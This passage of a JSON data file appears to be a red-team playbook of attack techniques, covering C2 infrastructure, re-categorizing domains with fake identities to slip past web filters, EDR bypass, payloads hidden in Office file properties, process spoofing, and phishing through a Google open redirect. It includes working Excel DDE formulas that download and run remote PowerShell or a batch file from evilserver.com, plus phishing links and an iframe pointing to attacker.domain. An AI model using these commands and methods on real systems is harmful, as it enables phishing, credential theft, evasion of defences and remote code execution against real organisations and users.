[
    {
        "id": "52259804-a1fb-4a97-be85-3544e4612ff9",
        "name": "Command and Control",
        "phase": "00. Infrastructure",
        "ttp": "TA0011",
        "external": true,
        "description": "Setup command and control infrastructure to remotely control software agents on target machines.",
        "content": "Technique Command and Control involves specific methods related to Setup command and control infrastructure to remotely control software agents on target machines..",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [
            "Brute Ratel",
            "Sliver",
            "Cobalt Strike"
        ],
        "steps": [
            {
                "id": "7eccaefb-fa6d-4430-96e2-cd53fa230759",
                "name": "Provision C2 Infrastructure",
                "description": "Set up a dedicated infrastructure to act as a command and control server for managing agents.",
                "requirements": {},
                "results": [
                    "C2:INFRASTRUCTURE:SETUP"
                ]
            },
            {
                "id": "55dc29a7-b7a2-4983-9d34-e6fc8488ff9d",
                "name": "Deploy Listener for Agents",
                "description": "Deploy a listener on the C2 server to receive and manage connections from target systems.",
                "requirements": {},
                "results": [
                    "C2:LISTENER:DEPLOYED"
                ]
            },
            {
                "id": "3ab7e212-d459-4ea6-90ab-40fd9a3163fb",
                "name": "Validate Agent Communication",
                "description": "Verify that the C2 server can successfully communicate with connected agents by sending test commands.",
                "requirements": {},
                "results": [
                    "C2:COMMUNICATION:VERIFIED"
                ]
            }
        ]
    },
    {
        "id": "f79f55a9-b0c5-4f0f-91f8-eb309e3b9d05",
        "name": "Payload Hosting",
        "phase": "00. Infrastructure",
        "ttp": "T1105",
        "external": true,
        "description": "Possibilities to host payloads externally without getting blocked (domain blocking vs. subdomain blocking)",
        "content": "Technique Payload Hosting involves specific methods related to Possibilities to host payloads externally without getting blocked (domain blocking vs. subdomain blocking).",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "02c660be-71dd-4297-8fcf-5e18d4cdbc47",
                "name": "Identify Secure Hosting Provider",
                "description": "Choose a trusted hosting provider or infrastructure to store and distribute payloads securely.",
                "requirements": {},
                "results": [
                    "PAYLOAD:HOSTING:IDENTIFIED"
                ]
            },
            {
                "id": "7da925eb-9a99-449d-bc8a-a5a957502ad3",
                "name": "Upload Payload",
                "description": "Upload the payload to the selected hosting service, ensuring proper access controls are configured.",
                "requirements": {},
                "results": [
                    "PAYLOAD:UPLOADED"
                ]
            },
            {
                "id": "84fc3a72-1993-4a07-b212-9eebcd7cce54",
                "name": "Test Payload Accessibility",
                "description": "Verify that the payload can be accessed securely and undetected from the target environment.",
                "requirements": {},
                "results": [
                    "PAYLOAD:ACCESS:VERIFIED"
                ]
            }
        ]
    },
    {
        "id": "61bda7a3-a3ec-4a72-95b9-6282d0c59916",
        "name": "Redirector",
        "phase": "00. Infrastructure",
        "ttp": "T1583",
        "external": true,
        "description": "Setup of redirectors in order to avoid leaking the c2 servers ip address",
        "content": "# Redirectors\n\n## Tools\n########\n########\n\n## [[AzureC2Relay]]\n\n\n## [[cs2modrewrite]]\n\n\n## [[cs2webconfig]]\n",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [
            "AzureC2Relay",
            "cs2modrewrite",
            "cs2webconfig"
        ],
        "steps": [
            {
                "id": "75b9af4d-b380-42be-aa45-66ecb8d58cca",
                "name": "Set Up a Redirector",
                "description": "Configure a redirector to act as an intermediary between the target and the command and control (C2) server. Use tools like AzureC2Relay or custom configurations for your infrastructure.",
                "requirements": {},
                "results": [
                    "REDIRECTOR:SETUP:COMPLETED"
                ]
            },
            {
                "id": "25b24a8a-f6e5-4042-b7a8-0d196c587850",
                "name": "Test Redirector Functionality",
                "description": "Verify that the redirector successfully forwards traffic to the C2 server without exposing its IP address.",
                "requirements": {},
                "results": [
                    "REDIRECTOR:FUNCTIONALITY:VERIFIED"
                ]
            },
            {
                "id": "0d14ae5b-8a18-4983-b79a-9787a3b30949",
                "name": "Configure Firewall Rules",
                "description": "Set up firewall rules to ensure only authorized traffic is routed through the redirector to the C2 server.",
                "requirements": {},
                "results": [
                    "REDIRECTOR:FIREWALL:CONFIGURED"
                ]
            }
        ]
    },
    {
        "id": "f7454737-d821-4d25-a712-8fcac8537c17",
        "name": "Aged Domains",
        "phase": "00. Infrastructure",
        "ttp": "T1583.001",
        "external": true,
        "description": "Buying ages domains in order to bypass trust based network filtering",
        "content": "# Aged Domains\n\n## Purpose\nDomains with short lifespan (generally less than 30 days) are often marked as high risk and blocked at clients. Further domains are categorized in different categories such as finance but also phishing. Uncategorised domains or with category 'placeholder' are also considered high risk. \n\nOPSEC WARNING!: If possible, immediately request a new category, do not check the category beforehand! Otherwise your site is categorised anyways with 'uncategorised' instead of immediately what you want it to be. There is a chance that reassigning categories are verified by analysts. This increases the chance of the domain being categorised as something like 'placeholder' (which is a blocked category at some banks) \n\nThere are four ways to get a domain that will not be blocked by web categorization filters:\n* age and categorize a new domain\n* buy an expired domain with still a category assigned\n* use high trust domain as redirector (f.e. phishingdomain.azureedges.net)\n* buy a \u201csubdomain.eu.com\u201d domain (eu.com is not an official top level domain so many solutions look for the age and categorization to eu.com instead of subdomain.eu.com)\n\n## Buy an expired domain with still a category assigned\nThe previous method takes time (at least 30 days) to work. When a domain is needed in a shorter period, it is often better to buy an expired domain. The downside is that we have less control over how the domain will look like. \n\nWhen domains expire, often web categorization services are not updated quickly enough. By buying a domain that has just expired, but is still seen as valid and trusted by these services, we can set this up in a short time.\n\nThe following three steps will take care of this: \n* check for an expired domain on expireddomains.net (you will need to make a bogus account)\n* check if a category of \u2018financial'/\u2019business'/'technology'/\u2026 is still assigned to it by the desired web categorization service (see table above)\n* buy it on Eurodns\n\n## use high trust domain as redirector\nTODO: To be worked out\n\n## Buy a \u201csubdomain.eu.com\u201d domain\neu.com is not an official top level domain so many solutions look for the age and categorization to eu.com instead of subdomain.eu.com \n\nBy default you will get\n* age = 26 years\n* category = portal/search engine/web hosting (or something similar based on vendor)\n\nJust always check if the security solution you are up against is also checking things this way\n\nThis trick does not work against\n* umbrella client\n\n## Tools\n########\n########\n\n## [[PowerView]]\n### Get-Domain\n\n```powershell\nGet-Domain\n\nForest                  : evil.corp\nDomainControllers       : {dc-2.edu.evil.corp}\nChildren                : {}\nDomainMode              : Unknown\nDomainModeLevel         : 7\nParent                  : evil.corp\nPdcRoleOwner            : dc-2.edu.evil.corp\nRidRoleOwner            : dc-2.edu.evil.corp\nInfrastructureRoleOwner : dc-2.edu.evil.corp\nName                    : edu.evil.corp\n```\n\n### Get-DomainPolicyData\n\n```powershell\nGet-DomainPolicyData | select -ExpandProperty SystemAccess\n\nMinimumPasswordAge           : 1\nMaximumPasswordAge           : 42\nMinimumPasswordLength        : 7\nPasswordComplexity           : 1\nPasswordHistorySize          : 24\nLockoutBadCount              : 0\nRequireLogonToChangePassword : 0\nForceLogoffWhenHourExpire    : 0\nClearTextPassword            : 0\nLSAAnonymousNameLookup       : 0\n```\n\n### Get-DomainSID\n\n```powershell\nGet-DomainSID\n```\n\n### Get SID of Group\n\n```powershell\nGet-DomainGroup -Identity \"Domain Admins\" -Domain evil.corp -Properties ObjectSid\n\nobjectsid                                   \n---------                                   \nS-1-5-21-378720957-2217973887-3501892633-512\n```\n\n### Convert SID\n\n```powershell\nConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1125\n```\n\n## [[SharpHound]]\nAll information\n> SharpHound.exe -c All --randomfilenames --memcache -d <domain> --throttle 10000 --jitter 10 --zippassword \"RT2022!\" --ldapusername <user> --ldappassword \"<pw>\" --domaincontroller <ip> --excludedcs\n\n#opsec: use --stealth, but that removes:\n* LoggedOn\n* DCOM\n* RPD\n* PSRemote\n* LocalAdmin\n\nAdditionally to snapshot\n> SharpHound.exe -c \"Container, LocalGroup, GPOLocalGroup, Session, LoggedOn, RDP, DCOM\" --randomfilenames --memcache -d <domain> --throttle 10000 --jitter 10 --stealth --zippassword \"RT2022!\" --ldapusername <user> --ldappassword \"<pw>\" --domaincontroller <ip>\n\n## [[SharpView]]\nSee [[PowerView]]\n> execute-assembly C:\\Tools\\SharpView\\SharpView\\bin\\Debug\\SharpView.exe Get-Domain\n\n## [[sublist3r]]\n\n\n## [[wmic]]\n```cmd\nDomain DC and Information\nwmic NTDOMAIN GET DomainControllerAddress,DomainName,Roles\n\nList all users\nwmic /NAMESPACE:\\\\root\\directory ldap PATH ds_user GET ds_samaccountname\n\nGet all groups\nwmic /NAMESPACE:\\\\root\\directory ldap PATH ds_group GET ds_samaccountname\n\nMembers of Domain Admins Group\nwmic path win32_groupuser where (groupcomponent=\"win32_group.name='domain admins',domain =='YOURDOMAINHERE'\")\n\nList all computers\nwmic /NAMESPACE: root directory ldap PATH ds_computer GET\nds_samaccountname\n```",
        "category": "Domains",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "68377c23-21aa-47e4-8882-4fc55a9c036a",
                "name": "Acquire Aged Domain",
                "description": "Search for and purchase an aged domain that retains a trusted categorization. Use platforms like expireddomains.net to identify candidates.",
                "requirements": {},
                "results": [
                    "AGED DOMAIN:ACQUIRED"
                ]
            },
            {
                "id": "e47c7762-fff5-4747-8586-c7744e521224",
                "name": "Validate Domain Categorization",
                "description": "Confirm the domain's categorization through web categorization services to ensure it bypasses filtering systems.",
                "requirements": {},
                "results": [
                    "AGED DOMAIN:CATEGORIZATION:VERIFIED"
                ]
            },
            {
                "id": "45efbe40-b763-4532-b9ee-e4f4a5ae9846",
                "name": "Set Up Domain for Operations",
                "description": "Configure the purchased domain to host content or redirect traffic as required for the operation.",
                "requirements": {},
                "results": [
                    "AGED DOMAIN:SETUP:COMPLETED"
                ]
            }
        ]
    },
    {
        "id": "038b4138-cd4b-4c17-af49-06a83bede7d7",
        "name": "Categorize Domain",
        "phase": "00. Infrastructure",
        "ttp": "T1583.001",
        "external": true,
        "description": "Categorizing / Regategorizing domains in order to bypass trust based network filtering",
        "content": "## Setting up dummy site\nTwo steps: \n* point the domain to the dummy site you want it to be categorised to\n* request a category from the different services \n\n## Request a category\nRequest a new finance category on the following sites: \n\nIMPORTANT: Immediately request a new category, do not check the category beforehand! Otherwise your site is categorised anyways with 'uncategorised' instead of immediately what you want it to be. There is a chance that reassigning categories are verified by analysts. This increases the chance of the domain being categorised as something like 'placeholder' (blocked category at some banks)     \n\nSide note: Use fake details when asked for Name, Email, Company name. Create for example a protonmail account for email.\n\n| | |\n|---|---|\n| Fortinet | https//fortiguard.com/faq/wfratingsubmit <br/>https://www.fortiguard.com/learnmore#wf |\n| Bluecoat | https://sitereview.bluecoat.com/ <br/> - top domain is sufficient, no need for subdomains (if you submit subdomain, categories are not transferred to the domain, but categories for the domain are transferred to the subdomains as well) <br/> - it seems (this might be incorrect) that bluecoat manually verifies domains that have been requesting financial categories but automatically assigns other categories such as sport/recreation |\n| palo alto | https://urlfiltering.paloaltonetworks.com/ |\n| F5 | Not public |\n| Check Point | https://www.checkpoint.com/urlcat/ <br/>(even with free account not much you can do) |\n| McAfee | https://www.trustedsource.org/en/feedback/url?action=checksingle <br/>use an account |\n| Cisco WFA | Check category of domain <br/> https://talosintelligence.com/reputation_center/lookup <br/> There is limit of 10 requests <br/>Request new category: <br/> WSA FAQ: How do I verify which category a URL belongs to and submit a change request? <br/>1. Create bogus Cisco account <br/>2. Go to  https://talosintelligence.com/tickets <br/> 3. Click Create New Ticket.<br/> 4. Click Submit a Web Categorization Ticket. <br/> 5. Enter the URL, IP address, or domain of the website in question (up to 50 entries can be entered at a time) and click Get Category Data.<br/>6. In order to suggest the same category for multiple entries, choose from the categories in the box next to \"Bulk Select Download\" (up to five categories can be chosen). Then, from the Bulk Select Download drop-down list, choose Web Security Appliance.<br/> 7. In order to suggest categories for individual entries, choose from the categories box next to each entry in the column \"Suggested Content Categories\". Then, from the Select Platform drop-down list, choose Web Security Appliance.<br/> 8. Add comments and site descriptions to the box below the entries. Provide as much detail as possible.<br/> 9. Click SUBMIT.<br/> 10. Later, verify the status on the Talos Intelligence Tickets portal page.\n\n## Tools\n########\n########\n\n## [[Chameleon]]\n\u26a0\ufe0f When attempting to categorise a site in Bluecoat, do not check the category first otherwise it will end up uncategorised! Individual hosts can however be categorised differently.\n\n```\nusage: chameleon.py [-h] [--proxy <proxy>] [--check] [--submit]\n                    [--domain <domain>]\n\noptional arguments:\n  -h, --help         show this help message and exit\n  --proxy <proxy>    Proxy type: a = all, b = bluecoat, m = mcafee, i = IBM\n                     Xforce\n  --check            Perform check on current category\n  --submit           Submit new category\n  --domain <domain>  Domain to validate\n```",
        "category": "Domains",
        "stealthy": false,
        "changes": [],
        "tools": [
            "Chameleon"
        ],
        "steps": [
            {
                "id": "1c29e6a1-489b-4228-a691-683ea612be3b",
                "name": "Set Up Dummy Site",
                "description": "Point the domain to a dummy site that reflects the category you want to assign to the domain.",
                "requirements": {},
                "results": [
                    "CATEGORIZE DOMAIN:DUMMY SITE:CONFIGURED"
                ]
            },
            {
                "id": "c9fbd32f-7bc0-478f-9709-dca8d038ae05",
                "name": "Modify Pixels",
                "description": "Alter pixel-level elements of the dummy site to make it appear unique and avoid detection by automated systems.",
                "requirements": {},
                "results": [
                    "CATEGORIZE DOMAIN:PIXELS:MODIFIED"
                ]
            },
            {
                "id": "4a0f5b6d-6768-415f-8c6a-3e5f868424e3",
                "name": "Modify Text via AI",
                "description": "Use AI tools to rewrite content on the dummy site to ensure originality and compliance with the desired category.",
                "requirements": {},
                "results": [
                    "CATEGORIZE DOMAIN:TEXT:MODIFIED"
                ]
            },
            {
                "id": "cb141e5b-f105-4e13-90ec-5d163661c850",
                "name": "Request Category Change",
                "description": "Submit a category change request to web categorization services (e.g., Bluecoat, Fortinet).",
                "requirements": {},
                "results": [
                    "CATEGORIZE DOMAIN:CATEGORY CHANGE:REQUESTED"
                ]
            },
            {
                "id": "7bc4b3d1-e2ad-4030-a72d-1526c5f00b1f",
                "name": "Verify Category Assignment",
                "description": "Check the categorization of the domain through relevant services to ensure the new category has been applied.",
                "requirements": {},
                "results": [
                    "CATEGORIZE DOMAIN:CATEGORY:VERIFIED"
                ]
            }
        ]
    },
    {
        "id": "ee8a5da2-a82d-4bfe-a439-56c699242b97",
        "name": "Domain Fronting",
        "phase": "00. Infrastructure",
        "ttp": "T1090.004",
        "external": true,
        "description": "Domain Fronting in order to avoid burning the original IP of the c2 server",
        "content": "## Cloudfront\n\n## Tools\n########\n########",
        "category": "Domains",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "fc7e037e-53de-46e3-bc01-cbd4a20595c7",
                "name": "Set Up Fronting Domain",
                "description": "Configure a domain for fronting by using a CDN like CloudFront. Ensure it masks the original server's IP address.",
                "requirements": {},
                "results": [
                    "DOMAIN FRONTING:FRONTING DOMAIN:SETUP"
                ]
            },
            {
                "id": "d2f4ef10-e9ef-47be-a0c7-348c74d82dd4",
                "name": "Test Domain Fronting",
                "description": "Send requests through the fronting domain to verify that traffic is properly routed to the original server.",
                "requirements": {},
                "results": [
                    "DOMAIN FRONTING:TEST:SUCCESSFUL"
                ]
            }
        ]
    },
    {
        "id": "578f0caf-f3a9-49b4-a0ec-caf6b1903fd4",
        "name": "Password Spraying",
        "phase": "01. Initial Access",
        "ttp": "T1110.003",
        "external": true,
        "description": "Password spraying on services with cewl or",
        "content": "## Tools\n########\n########\n\n## [[Cewl]]\nSpider and build dictionary\n```\ncewl -w createWordlist.txt https://www.example.com\n```\n\nAdd minimum password length:\n```\ncewl -w createWordlist.txt -m 6 https://www.example.com\n```\n\n## [[SprayingToolkit]]\n",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [
            "Cewl",
            "SprayingToolkit"
        ],
        "steps": [
            {
                "id": "6d9d9a80-5ba0-4c1a-9c16-db21f5e3ad14",
                "name": "Generate Password List",
                "description": "Use tools like Cewl to generate a password list based on target-specific information.",
                "requirements": {},
                "results": [
                    "PASSWORD SPRAYING:PASSWORD LIST:GENERATED"
                ]
            },
            {
                "id": "01ad28b6-b7b2-465d-80a3-2f6bd1c2e348",
                "name": "Perform Password Spraying Attack",
                "description": "Execute a password spraying attack against the target systems using the generated password list.",
                "requirements": {},
                "results": [
                    "PASSWORD SPRAYING:ATTACK:EXECUTED"
                ]
            },
            {
                "id": "6fe8c181-fe4d-48b9-9b4d-62572a8a7969",
                "name": "Analyze Spraying Results",
                "description": "Review the results of the password spraying attack to identify successful authentication attempts.",
                "requirements": {},
                "results": [
                    "PASSWORD SPRAYING:RESULTS:ANALYZED"
                ]
            }
        ]
    },
    {
        "id": "0af4c866-7ced-4851-882a-639295a66ca9",
        "name": "Crowdstrike",
        "phase": "01. Initial Access",
        "ttp": "TA0005",
        "external": false,
        "description": "Bypass of Crowdstrike",
        "content": "# Crowdstrike\n\n## Execution\n* Lunch Loader.dll via rundll32.exe using ShellBrowserWindow\n* Loader.dll does Process Injection into own process with ETW and DLL blocking\n* CS beacon shellcode\n\n## Persistence\n1. [[OneDrive]]\n2. [[Teams]]\n\n### Notes\n* inline-execute assembly\n  * bypass dll-injection by edr during process creation\n\n\n## Tools\n########\n########",
        "category": "Evasion",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "7194cbf9-73bb-4b70-9cc0-2adee67ca9a7",
                "name": "Identify Bypass Method",
                "description": "Determine the most appropriate method to bypass Crowdstrike EDR, such as DLL injection or shellcode execution.",
                "requirements": {},
                "results": [
                    "CROWDSTRIKE:BYPASS METHOD:IDENTIFIED"
                ]
            },
            {
                "id": "36c42df6-68d2-4a8d-871e-63bb38a7fa60",
                "name": "Execute Bypass",
                "description": "Implement the identified bypass method to evade Crowdstrike EDR detection.",
                "requirements": {},
                "results": [
                    "CROWDSTRIKE:BYPASS:EXECUTED"
                ]
            },
            {
                "id": "fdb2f3fa-0c92-4827-95b6-d6e365437987",
                "name": "Verify Bypass Success",
                "description": "Test the target system to confirm that Crowdstrike EDR has been successfully bypassed.",
                "requirements": {},
                "results": [
                    "CROWDSTRIKE:BYPASS:VERIFIED"
                ]
            }
        ]
    },
    {
        "id": "d0bd1d39-35f3-4735-9124-4593b6db1a2b",
        "name": "File properties",
        "phase": "01. Initial Access",
        "ttp": "TA0005",
        "external": false,
        "description": "Macro leveraging file properties to hide its paylods and StdIn to avoid logging",
        "content": "# File Properties\n\n### Store Payload\n\n* Powershell command resides in the \"Author\" property\n  * Every time you edit the file, the \"Authors\" property will be deleted\n* Hide payload on custom Excel forms or even inside the working spreadsheet, in an encoded form\n\n### Store Arguments\n\n* PowerShell command's arguments via invocation with StdIn.WriteLine\n\n### Detection\n\n* AutoOpen is picked up by some AVs\n* Document_Open() is picked up by some AVs\n* AMSI (on Win10) will most likely block the payload\n* Variable is not used anywhere in the macro. Including some unused code is a simple obfuscation tactic though.\n\n### Execution\n\n1. Accessing the file's properties\n2. Leveraging Windows Script Host to run a program locally, manipulate the contents of the registry, create a shortcut, or access a system folder.\n3. Using WshShell object for executing PowerShell\n4. Append arguments via StdIn.WriteLine\n\n## Tools\n########\n########",
        "category": "Evasion",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "5515690f-fa8a-4a00-9d20-96916a900a0e",
                "name": "Embed Payload in File Properties",
                "description": "Store the PowerShell payload in the 'Author' or other metadata properties of a target file.",
                "requirements": {},
                "results": [
                    "FILE PROPERTIES:PAYLOAD:EMBEDDED"
                ]
            },
            {
                "id": "9f5baa61-3f54-4485-8665-912a75edcb9d",
                "name": "Obfuscate Payload Arguments",
                "description": "Encode PowerShell command arguments to avoid detection and append them via StdIn.WriteLine.",
                "requirements": {},
                "results": [
                    "FILE PROPERTIES:ARGUMENTS:OBFUSCATED"
                ]
            },
            {
                "id": "4271e0a0-becb-4a49-8e05-9b220bc77c6b",
                "name": "Execute Payload via Windows Script Host",
                "description": "Leverage Windows Script Host to execute the embedded payload by manipulating the file properties.",
                "requirements": {},
                "results": [
                    "FILE PROPERTIES:PAYLOAD:EXECUTED"
                ]
            }
        ]
    },
    {
        "id": "fd695c1f-d629-43ed-adb2-2cfc31b4a91b",
        "name": "Loader",
        "phase": "01. Initial Access",
        "ttp": "TA0005",
        "external": false,
        "description": "Short description for Loader",
        "content": "\n## [[Sandman]]\n",
        "category": "Evasion",
        "stealthy": false,
        "changes": [],
        "tools": [
            "Sandman"
        ],
        "steps": [
            {
                "id": "ac2ad08e-6949-426e-8339-d660aaac4e14",
                "name": "Select Payload for Loader",
                "description": "Identify the target payload to be executed by the loader, such as DLL or shellcode.",
                "requirements": {},
                "results": [
                    "LOADER:PAYLOAD:SELECTED"
                ]
            },
            {
                "id": "b9fb83a7-9504-4a47-85a0-1481aa8292f5",
                "name": "Inject Payload Using Loader",
                "description": "Use the loader to inject the selected payload into a process or memory space.",
                "requirements": {},
                "results": [
                    "LOADER:PAYLOAD:INJECTED"
                ]
            },
            {
                "id": "90d0d1e8-3562-4c5f-8d54-dff95f95d3d3",
                "name": "Verify Payload Execution",
                "description": "Confirm that the injected payload has executed successfully and achieves its intended effect.",
                "requirements": {},
                "results": [
                    "LOADER:PAYLOAD:EXECUTED"
                ]
            }
        ]
    },
    {
        "id": "9c8d6ddd-f5f3-4806-8db1-3b8af7d6113e",
        "name": "Parent-Process-Spoofing (PPS)",
        "phase": "01. Initial Access",
        "ttp": "T1134.004",
        "external": false,
        "description": "Short description for Parent-Process-Spoofing (PPS)",
        "content": "# Parent-Process-Spoofing\n\nSpoof via WMI call\nIn this instance, PowerShell will be a child of **WmiPrvSE.exe** rather than MS Word.\n``````\nDim proc As Object\nSet proc = GetObject(\"winmgmts:\\\\.\\root\\cimv2:Win32_Process\")\nproc.Create \"powershell\"\n``````\n\n## Detection\nFrom the Kibana home page, expand the menu in the top-left and then select **Discover** underneath the **Analytics** header.  In the search box, enter:\n\nDetect PowerPoint process injection\n``````\nevent.module : sysmon and event.type : process_start and process.parent.executable : *EXCEL.EXE | *WINWORD.EXE | *POWERPNT.EXE\n``````\n\n## Tools\n########\n########",
        "category": "Evasion",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "c9050a91-b031-4f72-a90c-fa522757f032",
                "name": "Create Spoofed Process",
                "description": "Use WMI to create a new process with a spoofed parent, such as setting PowerShell's parent to WmiPrvSE.exe.",
                "requirements": {},
                "results": [
                    "PARENT-PROCESS-SPOOFING (PPS):PROCESS:CREATED"
                ]
            },
            {
                "id": "2671d515-ba0b-410d-b390-86bf64d0ab42",
                "name": "Validate Parent-Child Relationship",
                "description": "Verify that the created process is spoofed successfully by checking the parent-child relationship.",
                "requirements": {},
                "results": [
                    "PARENT-PROCESS-SPOOFING (PPS):RELATIONSHIP:VALIDATED"
                ]
            }
        ]
    },
    {
        "id": "5ab08195-c6c7-4788-92df-265c1cd2bc44",
        "name": "Open Redirects",
        "phase": "01. Initial Access",
        "ttp": "T0000",
        "external": true,
        "description": "Use open redirects to phish victims",
        "content": "It was discovered that there is an open redirect feature/vulnerability in Google.\nThe following steps will descript the usage of this so called feature:\n1. Create an *_ah* directory on our domain and inside it another directory called *conflogin*\n2. Place our phishing page inside the *conflogin* directory in index.html or index.php file\n3. Send the following link to our target `https://accounts.google.com/ServiceLogin?continue=https%3A%2F%2Fappengine.google.com%2F_ah%2Fconflogin%3Fcontinue%3Dhttps%3A%2F%2Fattacker.domain%2F&service=ah`\n\n\n## Tools\n########\n########",
        "category": "Phishing",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "d6f5e33a-7b16-4981-845a-9d01c3143726",
                "name": "Set Up Redirect Directory",
                "description": "Create the required directory structure (e.g., *_ah/conflogin*) on your domain to host the phishing page.",
                "requirements": {},
                "results": [
                    "OPEN REDIRECTS:DIRECTORY:SETUP"
                ]
            },
            {
                "id": "171f4374-d775-48b7-ac12-1530639c4288",
                "name": "Deploy Phishing Page",
                "description": "Place the phishing page (e.g., index.html or index.php) in the redirect directory to capture user credentials.",
                "requirements": {},
                "results": [
                    "OPEN REDIRECTS:PHISHING PAGE:DEPLOYED"
                ]
            },
            {
                "id": "6d789e53-d181-46f3-af5d-8cdce2c2ce62",
                "name": "Validate Redirect Functionality",
                "description": "Test the redirect link to ensure it properly routes to the phishing page and captures data as expected.",
                "requirements": {},
                "results": [
                    "OPEN REDIRECTS:FUNCTIONALITY:VERIFIED"
                ]
            }
        ]
    },
    {
        "id": "ed543564-a7e6-471f-8696-8170f5148a89",
        "name": "Phishing",
        "phase": "01. Initial Access",
        "ttp": "T1566",
        "external": true,
        "description": "External Phishing via different tools to either gather credentials or plan a beacon",
        "content": "\n## [[mip22]]\n\n\n## [[NexPhisher]]\n",
        "category": "Phishing",
        "stealthy": false,
        "changes": [],
        "tools": [
            "MailSniper",
            "mip22",
            "Espoofer",
            "spoofcheck",
            "NexPhisher",
            "ruler"
        ],
        "steps": [
            {
                "id": "512716bc-6dda-4af7-bec3-7db924da392f",
                "name": "Craft Phishing Email",
                "description": "Design a phishing email with a convincing message and a link to the phishing page.",
                "requirements": {},
                "results": [
                    "PHISHING:EMAIL:CRAFTED"
                ]
            },
            {
                "id": "05fdb317-4a1a-4687-8d9f-a0069d32164c",
                "name": "Deploy Phishing Campaign",
                "description": "Send the phishing email to the target list while ensuring delivery bypasses spam filters.",
                "requirements": {},
                "results": [
                    "PHISHING:CAMPAIGN:DEPLOYED"
                ]
            },
            {
                "id": "4e4de53f-771d-4844-9e05-58981c094adf",
                "name": "Collect Credentials",
                "description": "Monitor the phishing page for submitted credentials and store them securely.",
                "requirements": {},
                "results": [
                    "PHISHING:CREDENTIALS:COLLECTED"
                ]
            }
        ]
    },
    {
        "id": "40131a8c-a25c-435c-8594-e0c8159ea994",
        "name": "Redirect Forms",
        "phase": "01. Initial Access",
        "ttp": "T0000",
        "external": true,
        "description": "Use open redirects to phish victims",
        "content": "# Redirect forms with Paypal\n## Process\n1. Run on HTML form load\n2. Intercept all requests directed to PayPal\n3. Route all requests to our server, eventhough the victims browser still communicate with the original PayPal webpage.\n\n* capture_redirect.js: https://gist.github.com/anonymous/3bf8342c76eba4da3f660cbffa24f5d8\n* PayPal phishing HTML form: https://gist.github.com/anonymous/75b5eb6578bbc5bfcabe44e8fbb952ea\n* jquery hashchange.min.js: https://gist.github.com/anonymous/950a70cdebd3e78b6e88312fa7d93250\n\n\n## Data URIs\nA common technique for URL spoofing is abusing the data URI scheme.\nThe Data URI can show media content in a web browser without hosting the actual data on the internet.\nData URIs follow this scheme:\n`data:[<mediatype>][;base64],<data>`\nHere, `<mediatype>` is one of the MIME media types.\n* https://gist.github.com/anonymous/907cc8e9dcc43c6a4412e682e5d5c2cd\n\nNotice the amount of space characters `data:text/html,https://accounts.google.com` part is visible by the target. The data:text/html part could also be used in the following manner data:text/html;base64,[base64 encoded HTML source].\n```\n<meta http equiv=\"Refresh\" content=\"0;url=data:text/html,https://accounts.google.com\n<iframe src='http://attacker.domain' style='z-index:9999;overflow:hidden;position:fixed;top:0px;left:0px;bottom:0px;right:0px;width:100%;height:100%; border:none;margin:0;padding:0;'> Your browser doesn't support iFrames</iframe>\">\n```\n\n## Obfuscation\n* [Dotless IP addresses and URL Obfuscation](https://web.archive.org/web/20140702141151/http:/morph3us.org/blog/index.php?/archives/35-Dotless-IP-addresses-and-URL-Obfuscation.html)\n* [Out of Character: Use of Punycode and Homoglyph Attacks to Obfuscate URLs for Phishing](http://www.irongeek.com/i.php?page=security/out-of-character-use-of-punycode-and-homoglyph-attacks-to-obfuscate-urls-for-phishing)\n* [How to Obscure Any URL](http://www.pc-help.org/obscure.htm#how)bypass-the-patch-to-keep-spoofing-the-address-bar-with-the-malware-warning/)\n* [Unicode Domains are bad](https://www.vgrsec.com/post20170219.html)\n* [Phishing with Unicode Domains](https://www.xudongz.com/blog/2017/idn-phishing/)\n\n\n## Tools\n########\n########",
        "category": "Phishing",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "b8bc573a-9d14-4d33-8277-20f3a4f3a2f5",
                "name": "Set Up Redirect Script",
                "description": "Deploy a JavaScript-based redirector to capture and forward form submissions to the attacker's server.",
                "requirements": {},
                "results": [
                    "REDIRECT FORMS:SCRIPT:DEPLOYED"
                ]
            },
            {
                "id": "2d4e7536-9f2c-4746-9f7d-98dd85a43fe5",
                "name": "Embed Redirect in Form",
                "description": "Integrate the redirect script into the target's form to capture user-submitted data.",
                "requirements": {},
                "results": [
                    "REDIRECT FORMS:EMBEDDED"
                ]
            },
            {
                "id": "8af124df-d08b-4e9e-85bb-8e2febffac84",
                "name": "Validate Data Collection",
                "description": "Test the form submission process to ensure that data is successfully captured and forwarded.",
                "requirements": {},
                "results": [
                    "REDIRECT FORMS:DATA:COLLECTED"
                ]
            }
        ]
    },
    {
        "id": "2225c5d5-2051-472a-a918-a3f8a9bd00a1",
        "name": "MS16-032 (DDE)",
        "phase": "01. Initial Access",
        "ttp": "T0000",
        "external": true,
        "description": "MS15-032 (DDE) vuln",
        "content": "# Exploiting MS16-032 via Excel DDE without macros\nDDE = transfer data between applications, a form of Inter-Process Communication (IPC)\nExecute cmd and the second part is the argument.\n```=cmd|'/c calc.exe'!A1```\n* Arguments have to be inside single quotes \n* Length restrictions on both the executable and the arguments\n* BYPASS: instruct powershell to load a script\n\nbase64 encoded\n```=cmd|'/c powershell.exe -w hidden $e=(New-Object System.Net.WebClient).DownloadString(\\\"https://trusted.domain/script.base64\\\");powershell -e $e'!A1```\n\nplain .ps1\n```=cmd|'/c powershell.exe -w hidden $e=(New-Object System.Net.WebClient).DownloadString(\\\"https://trusted.domain/script.ps1\\\");IEX $e'!A1```\n\nbat file via webdav (stealthier)\n```=cmd|'/c \\\\evilserver.com\\sp.bat;IEX $e'!A1```\n\n## MS16-032 via excel DDE functionality\n https://googleprojectzero.blogspot.co.uk/2016/03/exploiting-leaked-thread-handle.html",
        "category": "Office",
